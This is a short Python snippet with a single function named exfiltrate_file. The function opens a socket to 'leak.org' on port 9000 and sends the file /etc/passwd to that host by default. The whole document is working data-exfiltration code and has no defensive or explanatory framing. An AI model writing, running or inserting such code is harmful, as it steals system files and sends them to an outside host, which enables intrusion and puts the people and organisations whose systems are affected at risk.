import socket
def exfiltrate_file(filepath='/etc/passwd', host='leak.org', port=9000):
    s = socket.socket()
    s.connect((host, port))
    with open(filepath, 'rb') as f:
        s.sendfile(f)
